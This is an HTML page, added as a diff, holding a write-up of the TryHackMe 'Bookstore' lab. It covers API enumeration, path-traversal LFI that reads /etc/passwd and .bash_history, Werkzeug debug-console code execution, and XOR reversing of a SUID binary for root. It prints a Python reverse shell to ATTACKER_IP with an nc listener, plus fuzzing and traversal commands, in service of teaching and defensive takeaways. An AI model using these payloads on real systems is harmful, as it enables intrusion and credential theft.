@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bookstore — TryHackMe Writeup — Maks Huseynli</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:ital,wght@0,300;0,400;0,500;1,300&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:         #0b0f14;
+      --bg-2:       #0f1419;
+      --bg-3:       #141b22;
+      --bg-code:    #0d1117;
+      --border:     #1e2730;
+      --border-2:   #253040;
+      --text:       #c8d0da;
+      --text-dim:   #6b7a8d;
+      --text-faint: #3a4552;
+      --accent:     #4d9de0;
+      --accent-dim: #2d6fa8;
+      --green:      #34c759;
+      --yellow:     #ff9f0a;
+      --red:        #ff453a;
+      --mono: 'DM Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; -webkit-font-smoothing: antialiased; }
+
+    nav { position: fixed; top: 0; left: 0; right: 0; z-index: 100; background: rgba(11,15,20,0.88); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); }
+    .nav-inner { max-width: 1100px; margin: 0 auto; padding: 0 28px; height: 56px; display: flex; align-items: center; justify-content: space-between; }
+    .nav-brand { font-family: var(--mono); font-size: 13px; color: var(--accent); text-decoration: none; letter-spacing: 0.02em; }
+    .nav-links { display: flex; list-style: none; }
+    .nav-links a { font-size: 13px; color: var(--text-dim); text-decoration: none; padding: 6px 16px; border-radius: 4px; transition: color 0.2s; }
+    .nav-links a:hover { color: var(--text); }
+    .nav-links a.active { color: var(--accent); }
+
+    .hero { padding: 96px 28px 56px; max-width: 1100px; margin: 0 auto; border-bottom: 1px solid var(--border); }
+    .hero-meta { display: flex; align-items: center; gap: 10px; margin-bottom: 28px; flex-wrap: wrap; }
+    .badge { font-family: var(--mono); font-size: 10px; padding: 3px 9px; border-radius: 3px; letter-spacing: 0.07em; text-transform: uppercase; }
+    .badge-p { background: rgba(52,199,89,0.08);  color: var(--green);  border: 1px solid rgba(52,199,89,0.2); }
+    .badge-c { background: rgba(77,157,224,0.08); color: var(--accent); border: 1px solid rgba(77,157,224,0.2); }
+    .badge-d { background: rgba(255,159,10,0.08); color: var(--yellow); border: 1px solid rgba(255,159,10,0.2); }
+    .hero h1 { font-size: clamp(28px, 5vw, 52px); font-weight: 300; line-height: 1.1; letter-spacing: -0.025em; color: #dce5ef; margin-bottom: 18px; }
+    .hero h1 strong { font-weight: 600; color: #edf2f7; }
+    .hero-desc { font-size: 15px; color: var(--text-dim); font-weight: 300; max-width: 600px; line-height: 1.75; margin-bottom: 36px; border-left: 1px solid var(--border-2); padding-left: 20px; }
+    .hero-info { display: flex; gap: 40px; flex-wrap: wrap; }
+    .info-item { display: flex; flex-direction: column; gap: 4px; }
+    .info-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; }
+    .info-value { font-family: var(--mono); font-size: 12px; color: var(--text-dim); }
+    .info-value a { color: var(--accent); text-decoration: none; }
+
+    .body-wrap { display: grid; grid-template-columns: 1fr 196px; gap: 64px; max-width: 1100px; margin: 0 auto; padding: 64px 28px 120px; align-items: start; }
+
+    .toc { position: sticky; top: 76px; }
+    .toc-label { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 14px; }
+    .toc ul { list-style: none; display: flex; flex-direction: column; gap: 1px; }
+    .toc ul a { display: block; font-size: 11px; color: var(--text-dim); text-decoration: none; padding: 5px 8px; border-radius: 3px; border-left: 1px solid transparent; transition: color 0.15s, border-color 0.15s; }
+    .toc ul a:hover { color: var(--accent); border-left-color: var(--accent-dim); }
+
+    .section { margin-bottom: 64px; }
+    .s-num { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 6px; }
+    .section h2 { font-size: 19px; font-weight: 600; color: #dce5ef; letter-spacing: -0.018em; margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    .section h3 { font-size: 14px; font-weight: 500; color: #b0c0d0; letter-spacing: -0.01em; margin: 26px 0 10px; }
+    .section p { font-size: 14px; color: var(--text-dim); line-height: 1.8; margin-bottom: 12px; }
+    .section p strong { color: var(--text); font-weight: 500; }
+
+    pre { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .ph { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .pl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .pd { display: flex; gap: 5px; }
+    .pd span { width: 8px; height: 8px; border-radius: 50%; display: block; }
+    pre code { display: block; padding: 18px; font-family: var(--mono); font-size: 12px; line-height: 1.72; color: #a0b8cc; overflow-x: auto; }
+    .ck { color: #4a5a6a; font-style: italic; }
+    .ca { color: var(--accent); }
+    .cg { color: var(--green); }
+    .cr { color: var(--red); }
+    .cs { color: #ce9178; }
+
+    .callout { padding: 14px 18px; border-radius: 5px; margin: 18px 0; border-left: 2px solid; font-size: 13px; line-height: 1.7; }
+    .blue   { background: rgba(77,157,224,0.05);  border-color: var(--accent); color: #88aacc; }
+    .yellow { background: rgba(255,159,10,0.05);  border-color: var(--yellow); color: #aa8855; }
+    .red    { background: rgba(255,69,58,0.05);   border-color: var(--red);    color: #aa6666; }
+    .green  { background: rgba(52,199,89,0.05);   border-color: var(--green);  color: #66aa77; }
+    .callout strong { color: inherit; font-weight: 600; }
+
+    .ports { display: flex; gap: 1px; background: var(--border); border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 16px 0; }
+    .port { flex: 1; background: var(--bg-2); padding: 18px 14px; text-align: center; }
+    .port-num { font-family: var(--mono); font-size: 17px; color: var(--accent); font-weight: 500; }
+    .port-svc { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-top: 4px; }
+    .port-note { font-size: 10px; color: var(--text-faint); margin-top: 3px; }
+
+    .shot { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .sh { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; background: rgba(255,255,255,0.02); border-bottom: 1px solid var(--border); }
+    .sl { font-family: var(--mono); font-size: 10px; color: var(--text-faint); letter-spacing: 0.1em; text-transform: uppercase; }
+    .ss { font-family: var(--mono); font-size: 10px; color: var(--accent); }
+    .shot img { display: block; width: 100%; height: auto; background: var(--bg-3); }
+    .sc { padding: 9px 14px; font-size: 11px; color: var(--text-faint); font-style: italic; border-top: 1px solid var(--border); background: var(--bg-2); }
+
+    .steps { border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin: 18px 0; }
+    .step { display: grid; grid-template-columns: 52px 1fr; border-bottom: 1px solid var(--border); }
+    .step:last-child { border-bottom: none; }
+    .sn { display: flex; align-items: center; justify-content: center; background: var(--bg-2); border-right: 1px solid var(--border); font-family: var(--mono); font-size: 10px; color: var(--text-faint); padding: 14px 0; }
+    .sb { padding: 14px 18px; font-size: 13px; color: var(--text-dim); background: var(--bg); line-height: 1.7; }
+    .sb strong { color: var(--text); font-weight: 500; }
+
+    footer { border-top: 1px solid var(--border); padding: 28px; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; }
+    .footer-copy { font-family: var(--mono); font-size: 11px; color: var(--text-faint); }
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a { font-family: var(--mono); font-size: 11px; color: var(--text-faint); text-decoration: none; transition: color 0.2s; }
+    .footer-links a:hover { color: var(--text-dim); }
+
+    @media (max-width: 860px) { .body-wrap { grid-template-columns: 1fr; } .toc { display: none; } }
+    @media (max-width: 580px) { .hero, .body-wrap { padding-left: 20px; padding-right: 20px; } .ports { flex-direction: column; } .footer-inner { flex-direction: column; gap: 12px; } }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-inner">
+    <a class="nav-brand" href="../index.html">CyberMaks</a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../methodology.html">Methodology</a></li>
+      <li><a href="../about.html">About</a></li>
+      <li><a href="../index.html#writeups" class="active">Writeups</a></li>
+    </ul>
+  </div>
+</nav>
+
+<header class="hero">
+  <div class="hero-meta">
+    <span class="badge badge-p">TryHackMe</span>
+    <span class="badge badge-c">Web</span>
+    <span class="badge badge-c">Privesc</span>
+    <span class="badge badge-d">Medium</span>
+  </div>
+  <h1><strong>Bookstore</strong></h1>
+  <p class="hero-desc">REST API enumeration, LFI through an undocumented parameter, Werkzeug debug console RCE, and XOR-based binary reverse engineering for root.</p>
+  <div class="hero-info">
+    <div class="info-item"><span class="info-label">Platform</span><span class="info-value">TryHackMe</span></div>
+    <div class="info-item"><span class="info-label">Difficulty</span><span class="info-value">Medium</span></div>
+    <div class="info-item"><span class="info-label">Category</span><span class="info-value">Web / Privesc</span></div>
+    <div class="info-item"><span class="info-label">Room</span><span class="info-value"><a href="https://tryhackme.com/room/bookstoreoc" target="_blank" rel="noopener">tryhackme.com/room/bookstoreoc</a></span></div>
+  </div>
+</header>
+
+<div class="body-wrap">
+<main>
+
+  <section class="section" id="recon">
+    <div class="s-num">01</div>
+    <h2>Network Reconnaissance</h2>
+    <p>Full-range SYN scan with service detection to map the attack surface.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nmap -sS -sV -p- -T5 &lt;TARGET_IP&gt;
+<span class="ck"># -sS stealth SYN  -sV versions  -p- all ports  -T5 fast (CTF)</span></code></pre>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">nmap results</span></div>
+      <img src="book1.png" alt="Nmap scan showing ports 22, 80, 5000" loading="lazy" />
+      <div class="sc">Three open ports. Port 5000 on a non-standard service is the first thing worth investigating.</div>
+    </div>
+    <div class="ports">
+      <div class="port"><div class="port-num">22</div><div class="port-svc">SSH</div><div class="port-note">potential creds lateral move</div></div>
+      <div class="port"><div class="port-num">80</div><div class="port-svc">HTTP</div><div class="port-note">primary web surface</div></div>
+      <div class="port"><div class="port-num">5000</div><div class="port-svc">HTTP</div><div class="port-note">non-standard — API / dev</div></div>
+    </div>
+    <div class="callout blue"><strong>Assessment:</strong> Port 5000 on a non-standard service almost always means a dev or internal API — weaker security posture, higher chance of something exploitable.</div>
+  </section>
+
+  <section class="section" id="port80">
+    <div class="s-num">02</div>
+    <h2>Port 80 — Web Enumeration</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">port 80 — landing page</span></div>
+      <img src="book2.png" alt="Login page on port 80" loading="lazy" />
+      <div class="sc">Login page. Common credentials and basic SQLi returned nothing — not the vector here.</div>
+    </div>
+    <p>Login form was a dead end. Moved straight to directory enumeration to surface anything not linked from the main page.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ffuf -w /usr/share/wordlists/dirb/common.txt \
+     -u http://TARGET_IP/<span class="ca">FUZZ</span> \
+     -e .php,.html,.bak,.txt \
+     -mc 200,301,302</code></pre>
+    <p>ffuf hit one interesting path — and surfaced a JS file that turned out to be critical.</p>
+  </section>
+
+  <section class="section" id="sourcecode">
+    <div class="s-num">03</div>
+    <h2>Source Code Analysis — Info Disclosure</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser / devtools</span><span class="ss">/assets/js/api.js</span></div>
+      <img src="book3.png" alt="api.js with developer comments disclosing LFI in v1 API" loading="lazy" />
+      <div class="sc">Developer comments left in a production JS file. Full API structure and an explicit note about an LFI in v1.</div>
+    </div>
+    <p><code>/assets/js/api.js</code> had developer comments that should never ship to production. They detailed the full API path structure and called out a known vulnerability by name.</p>
+    <div class="callout red"><strong>Disclosed:</strong> v1 API (<code>/api/v1/</code>) has an LFI in the <code>file</code> parameter. v2 was patched — but v1 was never removed from the server.</div>
+    <p>Developers documented the bug, deployed the fix to v2, and forgot to take down v1. The endpoint remained live and fully accessible.</p>
+  </section>
+
+  <section class="section" id="port5000">
+    <div class="s-num">04</div>
+    <h2>Port 5000 — API Confirmation</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">port 5000 — v2 API response</span></div>
+      <img src="book4.png" alt="Port 5000 API returning JSON for /api/v2/resources/books/random4" loading="lazy" />
+      <div class="sc">v2 endpoint returns valid JSON. Confirms the path structure from api.js is accurate — v1 very likely still present.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET http://TARGET_IP:5000/api/v2/resources/books/random4
+<span class="ck"># JSON returned → v2 path confirmed → v1 likely still alive too</span></code></pre>
+  </section>
+
+  <section class="section" id="apidocs">
+    <div class="s-num">05</div>
+    <h2>API Documentation Discovery</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">ffuf on port 5000</span></div>
+      <img src="book5.png" alt="ffuf on port 5000 finding API docs endpoint" loading="lazy" />
+      <div class="sc">ffuf surfaces accessible API documentation on port 5000 — complete endpoint list with parameter names.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ffuf -w /usr/share/wordlists/dirb/common.txt \
+     -u http://TARGET_IP:5000/<span class="ca">FUZZ</span> \
+     -e .txt,.md,.json \
+     -mc 200,301</code></pre>
+  </section>
+
+  <section class="section" id="pivot">
+    <div class="s-num">06</div>
+    <h2>Dead End → Parameter Fuzzing</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">testing all documented endpoints</span></div>
+      <img src="book6.png" alt="All v2 API endpoints tested — all clean" loading="lazy" />
+      <div class="sc">Every documented endpoint tested — LFI, SQLi, command injection all clean. v2 is properly sanitized. Time to pivot.</div>
+    </div>
+    <p>All documented endpoints returned clean responses. The key realization: the bug might be in an <strong>undocumented parameter</strong> — not an undocumented endpoint. Shift strategy.</p>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># Pivot: endpoint fuzzing → parameter fuzzing against v1</span>
+wfuzz -c \
+  -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  --hc 404 \
+  -u "http://TARGET_IP:5000/api/v1/resources/books?<span class="ca">FUZZ</span>=../../../etc/passwd"</code></pre>
+    <div class="callout blue"><strong>Hypothesis:</strong> v1 API still exists. It may have undocumented parameters not listed anywhere. Fuzz every parameter name with a traversal payload and see what responds.</div>
+  </section>
+
+  <section class="section" id="breakthrough">
+    <div class="s-num">07</div>
+    <h2>The Breakthrough — Hidden Parameter</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">wfuzz — 'show' parameter hit</span></div>
+      <img src="book7.png" alt="wfuzz discovering undocumented 'show' parameter in v1 API" loading="lazy" />
+      <div class="sc">wfuzz hits on 'show' — undocumented, zero filtering. LFI confirmed in v1 endpoint.</div>
+    </div>
+    <div class="callout red"><strong>Root cause:</strong> v1 API was never deprecated. Remained live with a hidden <code>show</code> parameter that accepts arbitrary file paths with zero sanitization — not in the docs, not in the JS comments, only found by fuzzing.</div>
+  </section>
+
+  <section class="section" id="lfi">
+    <div class="s-num">08</div>
+    <h2>LFI Exploitation</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">/etc/passwd via show parameter</span></div>
+      <img src="book8.png" alt="LFI confirmed — /etc/passwd contents returned" loading="lazy" />
+      <div class="sc">Full /etc/passwd returned. Arbitrary file read confirmed. Direct path, no encoding needed.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET http://TARGET_IP:5000/api/v1/resources/books?show=/etc/passwd
+
+<span class="cg"># /etc/passwd returned in full</span>
+<span class="ck"># Next targets: .bash_history, SSH keys, app config, DB creds</span></code></pre>
+  </section>
+
+  <section class="section" id="creds">
+    <div class="s-num">09</div>
+    <h2>Credential Discovery via .bash_history</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">.bash_history via LFI</span></div>
+      <img src="book9.png" alt=".bash_history exposed via LFI — Werkzeug debug PIN in plaintext" loading="lazy" />
+      <div class="sc">.bash_history contains the Werkzeug debug PIN — stored in plaintext from when the dev ran the app with --debug.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">http</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+GET http://TARGET_IP:5000/api/v1/resources/books?show=.bash_history
+
+<span class="ck"># PIN exposed — ran app in debug mode during dev, never rotated before deploying</span></code></pre>
+    <div class="callout red"><strong>Critical:</strong> Debug console exposed in production on port 5000. PIN recoverable from bash history. Debug interfaces in production = direct RCE.</div>
+  </section>
+
+  <section class="section" id="rce">
+    <div class="s-num">10</div>
+    <h2>RCE via Werkzeug Debug Console</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">browser</span><span class="ss">debug console — authenticated</span></div>
+      <img src="book10.png" alt="Werkzeug interactive debugger unlocked with PIN" loading="lazy" />
+      <div class="sc">PIN accepted. Interactive Python shell running as the web app user — full code execution from the browser.</div>
+    </div>
+    <div class="callout yellow"><strong>Impact:</strong> Werkzeug interactive debugger = Python REPL on the server. Full stdlib access, subprocess, socket — anything Python can do, we can do from this browser tab.</div>
+  </section>
+
+  <section class="section" id="shell">
+    <div class="s-num">11</div>
+    <h2>Reverse Shell</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal + browser</span><span class="ss">python reverse shell → caught</span></div>
+      <img src="book11.png" alt="Python reverse shell executed in debug console, caught on nc listener" loading="lazy" />
+      <div class="sc">Payload executed in the console, shell caught on nc listener. Interactive access established.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">python — werkzeug console</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((<span class="cs">"ATTACKER_IP"</span>,7777))
+os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
+subprocess.call([<span class="cs">"/bin/sh"</span>,<span class="cs">"-i"</span>])</code></pre>
+    <pre><code><div class="ph"><span class="pl">attacker — nc listener</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nc -lvnp 7777</code></pre>
+  </section>
+
+  <section class="section" id="userflag">
+    <div class="s-num">12</div>
+    <h2>User Flag</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">shell connected + user.txt</span></div>
+      <img src="book12.png" alt="Shell received, cat user.txt returns flag" loading="lazy" />
+      <div class="sc">Connection received. user.txt captured. Initial compromise complete.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+cat user.txt
+<span class="cg">THM{...}</span></code></pre>
+  </section>
+
+  <section class="section" id="binary">
+    <div class="s-num">13</div>
+    <h2>Privesc — Binary Discovery</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">try-harder in home directory</span></div>
+      <img src="book13.png" alt="try-harder SUID binary in home dir, prompts for magic number" loading="lazy" />
+      <div class="sc">Custom SUID binary 'try-harder' in the home dir — prompts for a magic number. Needs reversing.</div>
+    </div>
+    <p>Post-exploitation enumeration surfaces a custom binary: <code>try-harder</code>. On execution it prompts: <em>"What's The Magic Number?!"</em>. Likely calls <code>setuid(0)</code> and spawns a shell on correct input — reverse engineering required.</p>
+  </section>
+
+  <section class="section" id="re">
+    <div class="s-num">14</div>
+    <h2>Binary Reverse Engineering</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">ghidra</span><span class="ss">decompiled try-harder</span></div>
+      <img src="book14.png" alt="Decompiled try-harder showing XOR check: input ^ 0x1116 ^ 0x5db3 == 0x5dcd21f4" loading="lazy" />
+      <div class="sc">Decompiled logic: input XOR 0x1116 XOR 0x5db3 must equal 0x5dcd21f4. XOR is self-inverse — trivially reversible.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">shell — transfer binary</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+<span class="ck"># on target</span>
+python3 -m http.server 8080
+
+<span class="ck"># on attacker</span>
+wget http://TARGET_IP:8080/try-harder</code></pre>
+    <pre><code><div class="ph"><span class="pl">c — decompiled logic (ghidra)</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+void main(void) {
+    setuid(0);                      <span class="ck">// becomes root if SUID bit set</span>
+    uint constant = 0x5db3;
+    puts(<span class="cs">"What's The Magic Number?!"</span>);
+    scanf(<span class="cs">"%u"</span>, &user_input);
+    result = user_input ^ 0x1116 ^ constant;
+    if (result == 0x5dcd21f4) {
+        system(<span class="cs">"/bin/bash -p"</span>);  <span class="ck">// root shell</span>
+    } else {
+        puts(<span class="cs">"Incorrect Try Harder"</span>);
+    }
+}</code></pre>
+    <p>XOR is self-inverse — to find the input, XOR the target with the same constants:</p>
+    <pre><code><div class="ph"><span class="pl">python</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+magic = 0x5dcd21f4 ^ 0x5db3 ^ 0x1116
+print(magic)       <span class="ck"># decimal for the prompt</span>
+print(hex(magic))  <span class="ck"># verify</span>
+
+<span class="cg">1573743953   # 0x5dcd6d51</span></code></pre>
+  </section>
+
+  <section class="section" id="root">
+    <div class="s-num">15</div>
+    <h2>Root</h2>
+    <div class="shot">
+      <div class="sh"><span class="sl">terminal</span><span class="ss">try-harder → root shell</span></div>
+      <img src="book15.png" alt="try-harder accepts 1573743953, spawns root shell, whoami → root" loading="lazy" />
+      <div class="sc">Magic number accepted. /bin/bash -p via setuid. whoami → root. Both flags captured.</div>
+    </div>
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+$ ./try-harder
+What's The Magic Number?!
+<span class="cs">1573743953</span>
+<span class="cg"># whoami</span>
+<span class="cg">root</span>
+
+cat /root/root.txt
+<span class="cg">THM{...}</span></code></pre>
+    <div class="callout green"><strong>Chain complete.</strong> Nmap → client-side info disclosure → LFI via undocumented param → .bash_history cred → debug console RCE → rev shell → binary RE → root. ✓ user.txt ✓ root.txt</div>
+  </section>
+
+  <section class="section" id="takeaways">
+    <div class="s-num">16</div>
+    <h2>Key Takeaways</h2>
+    <div class="steps">
+      <div class="step"><div class="sn">01</div><div class="sb"><strong>Strip dev comments before deploying.</strong> api.js disclosed the API structure and named the exact vulnerability. Minify and strip comments — or use build pipelines that do it automatically.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>Deprecated means deleted.</strong> Hiding the link to v1 is not the same as removing it. Old endpoints need to be actively taken down, not just undocumented.</div></div>
+      <div class="step"><div class="sn">03</div><div class="sb"><strong>Parameter fuzzing finds what endpoint fuzzing misses.</strong> All documented endpoints were clean. The bug lived in an undocumented parameter only fuzzing could reveal.</div></div>
+      <div class="step"><div class="sn">04</div><div class="sb"><strong>Never run debug interfaces in production.</strong> The Werkzeug debugger gave us a Python REPL on the server. One exposed debug interface turned LFI into full RCE.</div></div>
+      <div class="step"><div class="sn">05</div><div class="sb"><strong>XOR is not authentication.</strong> Simple XOR checks in SUID binaries are instantly reversible. Any gate-keeping logic in a privesc binary must be cryptographically sound.</div></div>
+    </div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#port80">02 — Port 80</a></li>
+    <li><a href="#sourcecode">03 — Source Code</a></li>
+    <li><a href="#port5000">04 — Port 5000</a></li>
+    <li><a href="#apidocs">05 — API Docs</a></li>
+    <li><a href="#pivot">06 — Pivot</a></li>
+    <li><a href="#breakthrough">07 — Breakthrough</a></li>
+    <li><a href="#lfi">08 — LFI</a></li>
+    <li><a href="#creds">09 — Credentials</a></li>
+    <li><a href="#rce">10 — Debug RCE</a></li>
+    <li><a href="#shell">11 — Rev Shell</a></li>
+    <li><a href="#userflag">12 — User Flag</a></li>
+    <li><a href="#binary">13 — Binary</a></li>
+    <li><a href="#re">14 — RE Analysis</a></li>
+    <li><a href="#root">15 — Root</a></li>
+    <li><a href="#takeaways">16 — Takeaways</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 Maks Huseynli</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
